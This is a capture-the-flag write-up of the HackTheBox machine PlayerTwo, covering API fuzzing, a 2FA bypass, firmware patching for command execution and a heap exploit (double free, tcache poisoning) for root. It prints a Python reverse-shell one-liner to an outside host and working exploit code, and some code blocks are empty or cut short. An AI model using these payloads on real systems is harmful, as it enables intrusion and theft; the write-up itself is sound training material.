---

# Overview
_PlayerTwo_ is MrR3boot's follow-up box to his box _Player_ - this time created in collaboration with b14ckh34rt.
It requires quite a bit of fuzzing and research on twirp to start the box, a little bit of binary exploitation for user and and even more so to get root without cheat codes.

# Recon
A `nmap -p- 10.10.10.170` reveals an interesting port 8545 besides the usual ssh and http ports.
```bash
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8545/tcp open  unknown
```
Going to http://10.10.10.170 shows an error message giving away the hostname thus we add 'player2.htb' to /etc/hosts and we can now browse to http://player2.htb.
Besides explaining what went wrong on the predecessor box player it showcases why the new product is much better. It mentions a _protobs protocol_ and leads us to a subdomain at`http://product.player2.htb` revealing a login page after adding the subdomain to /etc/hosts also. After trying a few standard username/password combinations such as admin/admin and a SQLi test we move on.
Fuzzing in the background for subdirectories on domain and subdomain show the following (bit shortened) results, the underlined directories will be important later on: 
{: .text-justify} 
{% include figure image_path="/assets/images/playerTwo/Gobuster.png" alt="this is a placeholder image" caption="`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u player2.htb` and <br/> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u product.player2.htb` respectively." %}
## Twirp
Browsing to `http://player2.htb:8545` gives away the service running on this port with the following response:
{: .text-justify}
```json
{"code":"bad_route","msg":"no handler for path \"\/\"","meta":{"twirp_invalid_route":"GET \/"}}
```
Twirp invalid route leads us to the _Twirp Wire Protocol_ which we have to find the endpoint of. To find out what the structure looks like its documentation [[0]](#[0]) comes in handy where it mentions a _.proto_ file which we fuzz for in the /proto directory, using wfuzz this time (gobuster with the `-x proto` flag works, too):
{: .text-justify} 
```bash
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://player2.htb/proto/FUZZ.proto

000036168:   200        18 L     46 W     266 Ch      "generated"                   
```
The just found `http://player2.htb/proto/generated.proto` file outlines the design of the service in use, which is basically identical to the structure of the example in the documentation [[0]](#[0]):
{: .text-justify} 
{% include figure image_path="/assets/images/playerTwo/Twirp.png" alt="this is a placeholder image" caption="A comparison between the Protobuf definition file of PlayerTwo and from the documentation of _twirp_." %}
So we can deduce from the file that the service in use is an auth service and furthermore on [[0]](#0) the format of the endpoint is specified as
```html
POST /twirp/<package>.<Service>/<Method>
```
which translates to `/twirp/twirp.player2.auth.Auth/GenCreds` in our case and since the error message when browsing to this endpoint isn't the same as before we know we progressed:
```json
{"code":"bad_route","msg":"unsupported method \"GET\" (only POST is allowed)","meta":{"twirp_invalid_route":"GET \/twirp\/twirp.player2.auth.Auth\/GenCreds"}}
```
## Creating credentials
Reading the docs further we see how we can access the service using curl and running the following command a couple of times we get five different sets of creds:
```bash
curl --request POST --location "http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds" --header "Content-Type:application/json" --data '{"":6}'
# From reading the docs I expected --data '{"count":number}' to work but it doesn't - not sure why
```
```json
{"name":"0xdf","pass":"XHq7_WJTA?QD_?E2"}
{"name":"snowscan","pass":"XHq7_WJTA?QD_?E2"}
{"name":"mprox","pass":"tR@dQnwnZEk95*6#"}
{"name":"jkr","pass":"Lp-+Q8umLW5*7qkc"}
{"name":"0xdf","pass":"ze+EKe-SGF^5uZQX"}
```
Trying these creds on the login page found earlier we are greeted by a two factor authorization!
{% include figure image_path="/assets/images/playerTwo/2fa.png" alt="this is a placeholder image" caption="" %}
As we probably have no chance of guessing the right pin and brute-froce is never an option on HTB, we fuzz again, this time `http://product.player2.htb/api`. And with using a suitable wordlist we finally find another endpoint:
{: .text-justify}
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -u product.player2.htb/api

/totp (Status: 200)
```
So we catch the request with _burp_ to grab the PHPSESSID cookie, change the request method to _POST_, switch to curl and are greeted by an "Invalid action" error. By adding an action 
```bash
curl -X POST --header "Cookie: PHPSESSID=l2frl7cqoro7ufdsqsvgttb6vm" -H "Content-Type:application/json" --location "http://product.player2.htb/api/totp" --data '{"action": "some_action"}'
```
we advance to
```json
{"error":"Missing parameters"}
```
From this we have a couple of options. We can write a small script on that or just guess some actions. In my case I guessed the action to be a number and got the following:
{: .text-justify}
```bash
curl -X POST --header "Cookie: PHPSESSID=l2frl7cqoro7ufdsqsvgttb6vm" -H "Content-Type:application/json" --location "http://product.player2.htb/api/totp" --data '{"action": 0}'
```
```json
{"user":"jkr","code":"29389234823423"}
```
as I was using jkr's credentials and we are in.

## Protobs Part 1
Exploring the web page we find the following section which links to a documentation of the _Protobs Firmware_ which includes a link to the firmware itself, as well as a link to a file upload:
{: .text-justify}
{% include figure image_path="/assets/images/playerTwo/ProtobsAccess.png" alt="this is a placeholder image" %}
{% include figure image_path="/assets/images/playerTwo/Doc.png" alt="this is a placeholder image"%}
{% include figure image_path="/assets/images/playerTwo/FileUpload.png" alt="this is a placeholder image"%}

Unpacking the tar file gives us for the most part a binary called _Protobs.bin_:
```bash
kali@kali:~/HTB/boxes/player2/binary$ chmod +x Protobs.bin 	# making it executable
kali@kali:~/HTB/boxes/player2/binary$ ./Protobs.bin		# file doesn't run
bash: ./Protobs.original: cannot execute binary file: Exec format error
kali@kali:~/HTB/boxes/player2/binary$ file Protobs.bin		# Analysing
Protobs.bin: data						# Can't make much of it
kali@kali:~/HTB/boxes/player2/binary$ binwalk Protobs.bin	# See if sth useful is in there

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
64            0x40            ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)

kali@kali:~/HTB/boxes/player2/binary$ dd if=Protobs.bin of=Protobs.removed skip=64 bs=1
17200+0 records in

kali@kali:~/HTB/boxes/player2/binary$ file Protobs.removed 
Protobs.removed: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=82adae308a0023a272e626bbe83d97b2b9c630f6, for GNU/Linux 3.2.0, not stripped

```
By removing the first 64 bytes the `file` command now recognizes the binary as an ELF 64-bit executable but also the code in `Ghidra` is now much more readable:
{: .text-justify}
{% include figure image_path="/assets/images/playerTwo/Firmware.png" alt="this is a placeholder image" caption="The firmware reverse engineered in _Ghidra_. Every time the binary gets executed, the main function calls _wait_for_fkey_ in which we see multiple system calls."  %}
Following the path of execution when the binary is run we see multiple system calls inside the _wait_for_fkey_ function. System calls are dangerous because they directly execute the argument on the system the binary is executed on, therefore, if we can run the binary on the remote machine and overwrite the system call to something that is useful for us as an attacker we win.
Quoting the sentence below the file upload, it says that the firmware is sign tested on whether it is signed and working as intended, so we have chance that it will be executed after uploading. The latter part is doable with a hexeditor and we have a couple of options on what to overwrite the argument with. A simple test to check if the binary is executed after uploading would be to put a `ping -c 4 your_ip` in there and listen to incoming packages with _tcpdump_.
To do this we need to load the original binary into `Ghidra` and search for the first system call within the _wait_for_fkey_ function, identify the address _20e4_ and search that address in a hex editor of choice we loaded the binary in. We then replace the original by the ASCII code of our payload:
{: .text-justify} 
{% include figure image_path="/assets/images/playerTwo/Hex.png" alt="this is a placeholder image" caption="Upper part: Original binary loaded in _Ghidra_. Marked red is the address of the argument string. Green is the argument string denoted in ASCII format. <br/> Middle: Original view in a hex editor. 73 in ASCII is equivalent to the character lower s. <br/> Lower: Overwritten argument. To write a p one has i.e. to replace the 73 by 70."  %}
Setting up the listener and uploading the edited file results in the desired four ping packages thus we have code execution:
{: .text-justify}
```bash
sudo tcpdump -i tun0
08:18:49.392816 IP p2 > 10.10.14.7: ICMP echo request, id 34815, seq 1, length 64

[snip]
08:18:52.385493 IP p2 > 10.10.14.7: ICMP echo request, id 34815, seq 4, length 64
08:18:52.385534 IP 10.10.14.7 > p2: ICMP echo reply, id 34815, seq 4, length 64
```
As we now can execute code on the remote machine we have again a couple of options:
- writing reverse shell code in there
- upload a webshell via _wget_ and probably a lot more

I opted to go for the reverse shell code and after trying a few different options the python reverse shell code worked (yea it's long and ugly but working is working):
{: .text-justify} 
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
and boom - we've got a shell on the box - but still no user flag :/ But we notice a MQTT service running on port 1883:

```
We can subscribe to all topics using `mosquitto_sub -t '$SYS/#'` and are disappointed because we don't get any useful info. However keeping it running for some time we notice that every once in a while a SSH private key is broadcasted:
{: .text-justify}
```shell

```
And for the first time we are lucky as the key is not password protected and we can connect right away to own user:

# Root Part (intended way)
------------------------
Searching for SUID files shows an interesting file called Protobs:
```shell
observer@player2:~$ find / -perm /4000 2>/dev/null

/usr/bin/pkexec
/usr/bin/at
/opt/Configuration_Utility/Protobs

```
Looking into this directory we see that we get the helper library and libc used by Protobs:
```bash
observer@player2:~$ ls /opt/Configuration_Utility/
ld-2.29.so  libc.so.6  Protobs
```
Running the file shows the typical menu style for binary exploitation type of problems:

## Playing the game, Protobs part 2
In the following the exploitation of the binary via a double free will be presented. It is also possible to exploit the binary by coalesing two chunks, which is shown here [[Appendix]](#Appendix).
{: .text-justify}
- As ASLR is enabled on the machine we need to leak a libc address in order to get the libc base address from which we can calculate the addresses of the free hook and the system function.
- Looking at the reversed binary we notice a one byte overwrite vulnerability. Since that one byte overwrite will always be done with a null byte we cannot follow guides like [[1]](#[1]) exactly but I recommend watching it as it shows the possibilities which arise by such a vulnerability and also covers tcache poisoning which we also will use.
- In order to overwrite data we need chunks that are _directly adjacent_. Since every chunk starts with the chunk size header (basically containing information about the size of the chunk and signalling whether the chunk is in-use with the LSB) that is the information we will be able to target. This also implies that overwriting chunk sizes smaller than 0x100 will result in a chunk size header which is the null byte. If we overwrite a header of size say 0x180 it'll be 0x100. Because of the fact that every config we create will always start with a header of 0x41 for the _name_ of the config (we can only choose the size for the _description_) we have to find a way around it to align to descriptions adjacent.
- Once we've overwritten the chunk size header appropriately we can double free it and perform a tcache poisoning as described in the writeup of the _zero_to_hero_ challenge here [[1]](#[1]).
### Leaking libc
In order to leak libc, writeups such as the babyheap defcon challenge [[2]](#2) were really helpful to me for more details go there, I'll sum it up:<br/>
Each tcache can hold 7 same-size chunks when freed before it puts other freed chunks of this size into the unsorted bin. Thus we need to allocate and then free more than 7 chunks of same size, I went with size 0xf8. If we allocate and free 9 chunks we notice a chunk in the unsorted bin with its fd/bk pointer pointing into libc by running `heap bins`:
{: .text-justify} 
```python
for i in range(9):	# add creates a config of size 0xf8, description content "A"*0x20
    add(0xf8, "A"*0x20)	# and name of config is "" here
for i in range(9):	
    free(i)		# freeing the i-th config
```
{% include figure image_path="/assets/images/playerTwo/unsorted_bin.png" alt="this is a placeholder image" caption="The fd/bk pointer of the chunk in the unsorted bin points into the main arena of libc." %}
By clearing the tcache by allocating seven chunks of size 0xf8 and then allocating two empty configs we can leak this address. From the figure above we can also see that the libc base address is at 0x7effe6dab000 and our leaked address is 0x7effe6f8fca0. Since that difference is constant every time we run the binary and we can calculate the offset once (0x1e4ca0) and hardcode it.
{: .text-justify} 
```python
for i in range(7):		# clear tcache
    add(0xf8, b"A"*4)
add()				# add two empty configs
add()
main_arena_leak_u = readCFG(8)	# get leak
# addresses
# offset is constant in each runtime, so I looked it up in gdb and calculated it once
libc_base = main_arena_leak_u - 0x1e4ca0
free_hook = libc_base + 0x1e75a8
system = libc_base + 0x52fd0
```
From this base address we can also calculate the address of _free_hook_ and _system_ as their place will also be at a fixed place measured from the base address. Using _objdump -T_ on the libc we downloaded from the server via _scp_ will get us there:
{: .text-justify}
```bash
kali@kali:~/HTB/boxes/player2/binary_2$ objdump -T libc.so.6 | grep free_hook
00000000001e75a8  w   DO .bss   0000000000000008  GLIBC_2.2.5 __free_hook
```
Analog procedure for _system_.
### Null byte overwrite vulnerability
Looking at the binary in _Ghidra_ we notice in the function that creates a new config that once the game description is longer or equal to the chosen description size _n_ it is terminated by a null byte at the _n+1st_ position. However malloc allocates a chunk of size _n_ and then writes _n+1_ bytes. 
{: .text-justify} 
```c
if (*(uint *)(__dest + 0x28) <= (uint)sVar5) {		# length of the description is say 0x30 
	local_428[*(uint *)(__dest + 0x28)] = '\0'; 	# It contains 0x30 bytes of data + \x00
}
pvVar4 = malloc((ulong)*(uint *)(__dest + 0x28));	# allocates 0x30 bytes of data
while( true ) { 
	sVar6 = strlen(local_428);			# sets sVar6 to 0x31 bytes 
	if (sVar6 < (ulong)(long)counter) break; 
	*(char *)(counter + lVar1) = local_428[counter];# writes 0x31 bytes  
	counter = counter + 1;
}
```
### Aligning game descriptions adjacent
In order to be able to abuse the null byte overwrite we need two adjacent chunks. To illustrate how to accomplish this, we use _gdb_ to look at the heap and get an understanding of how the allocated chunks look like in memory.<br/>
For this we create a sample of two configs of size 0x38 and write 0x38 bytes of data into the name of the config as well as into the description and look then at the chunks in memory:
{: .text-justify}
```python
add(0x38, "A"*0x38, "A"*0x38)	# A's will be 41 in memory. The only constraint to the chunk
add(0x38, "B"*0x38, "B"*0x38)	# size is that it has to be congruent 8 modulo 16.
```
{% include figure image_path="/assets/images/playerTwo/Chunk1.png" alt="this is a placeholder image" caption="The fd/bk pointer of the chunk in the unsorted bin points into the main arena of libc." %}
{% include figure image_path="/assets/images/playerTwo/Chunk2.png" alt="this is a placeholder image" caption="Illustrating the null byte overwrite." %}
So to get two descriptions adjacent I thought that since the config name always needs a chunk of size 0x30 of usable size (which is 0x41 in memory): If I allocate one or two configs with description size 0x30 and free them the next configs with description sizes bigger than 0x30 might use the just freed 0x30 chunks but allocate the descriptions after all the previously allocated chunks. The code and result might clarify what I just tried to explain with words:
{: .text-justify} 
```python
add(0x38, "A"*0x38, "A"*0x38)	# A's will be 41 in memory
add(0x38, "B"*0x38, "B"*0x38)	# B's 42, 0x38 = 3*16+8 = 56 bytes
free(1)
free(0)
add(0x48, "C"*0x48, "C"*0x20)	# allocating two chunks with a size bigger than 0x30
add(0x68, "C"*0x68, "C"*0x20)	# but also with a size%16=8 
```
{% include figure image_path="/assets/images/playerTwo/Chunk3.png" alt="this is a placeholder image" caption="Game descriptions being adjacent - the setup needed for the double free." %}

So we only have to repeat what we have done earlier: free and then allocate the same chunk again:
```python
add(0x38, "A"*0x38, "A"*0x38)	# A's will be 41 in memory
add(0x38, "B"*0x38, "B"*0x38)	# B's 42, 0x38 = 3*16+8 = 56 bytes
free(1)
free(0)
add(0x48, "C"*0x48, "C"*0x20)	# allocating two chunks with a size bigger than 0x30
add(0x68, "C"*0x68, "C"*0x20)	# but also with a size%16=8 
free(0)
add(0x48, "C"*0x48, "C"*0x20)	
```
{% include figure image_path="/assets/images/playerTwo/Chunk4.png" alt="this is a placeholder image" caption="Our plan worked - we overwrote the chunk size header from 0x171 to 0x100." %}

### The double free
Now that we were able to set the chunk size header from 0x1XY to 0x100 we can do a double free attack similar to the before mentioned _zero_to_hero_ challenge [[1]](#[1]) with small variations.<br/>
To do this we need to allocte and free two dummies of size 0x30 (also 0x41 in memory) where we want to write our config name to. For the chunks I want to align the descriptions adjacent I chose sizes 0x58 (chunk 9) and 0x180 (chunk 10):
{: .text-justify} 
```python
# Dummies

free(9)			# 0x40 of the dummy and 0x180 _right after_ the 0x58 chunk.
```
The key is to free chunk 10 so this chunk will go into the 0x180 tcache bin. Then we will overwrite the chunk size from 0x180 to 0x100 with chunk 9 but also write `/bin/sh\x00` at the beginning of chunk 9. As the program will cut off descriptions after the first null byte, strings such as `p64('/bin/sh\x00') + b"A"*(0x50)` won't work as. To solve this puzzle we need to do it in two steps:
{: .text-justify} 
- overwrite the chunk 10's size header
- write `/bin/sh\x00` into chunk 9 and let the rest untouched

```python
# Dummies
add(0x30)	# Dummies are necessary to get two config _descriptions_ aligned right
add(0x30)	# after each other so that it is possible to overwrite the second chunk
		# size header. The size is deliberately set at 0x30, because this will
free(9)		# result in a chunk size of 0x41 in memory, which is also used for the 
free(10)	# config _name_. Freeing these two chunks results in 4 free 0x40 chunks.
# Allocate config descriptions adjacent in memory
add(0x58, 'A'*0x58)	# Allocation of size >0x40 will do the following: allocate 0x40 of the
add(0x180, 'B'*0x100)	# first dummy for config name and allocate 0x58 _after_ the dummies,
free(10)		# because there is no space for it earlier. Same goes for 0x180:
free(9)			# 0x40 of the dummy and 0x180 _right after_ the 0x58 chunk.
# /bin/sh and null byte overwrite the chunksize header from 191 to 100
add(0x58, 'A'*0x58)	# As the string will be terminated after the first null byte,
free(9)			# we have to do this in two steps. Overwrite first, free...
add(0x58, '/bin/sh\x00')# ... and write /bin/sh plus the null byte and leave the rest.
```
Setting the chunk size header of chunk 10 to 0x100 leaves the chunk inside the 0x190 tcache bin but sets its size to 0x100. Adding an empty chunk will now allocate a chunk at the same address where the previous 0x180 chunk was located however freeing it will put it into the 0x100 tcache bin. And if we now allocate a chunk size of 0x180 it will use the manipulated chunk size from the 0x190 tcache (because 0x180 will need 0x190 of memory space). But as we have changed its header from 0x191 to 0x100 it will be put into the 0x100 tcache bin thus we are having two chunks of size 0x100 in the tcache 0x100 bin but both point to the same address!

### Tcache poisoning
Now we simply need to do the Tcache poisoning:
- allocate 3 chunks each of size 0xf0, which will need 0x100 in memory thus using the chunks from the 0x100 tcache bin
- write the free hook into the first chunk, junk into the second, and the system call into the third.
- Free chunk 9
- Become root.

## Root - unintended
The trivial way of becoming root is to realize that for the ssh key to be sent via MQTT the ssh key from observers home directory is read. Feels like this was on purpose as this could have easily been fixed. Thus replacing the private key file with a symbolic link to `/root/root.txt` will get you the flag.
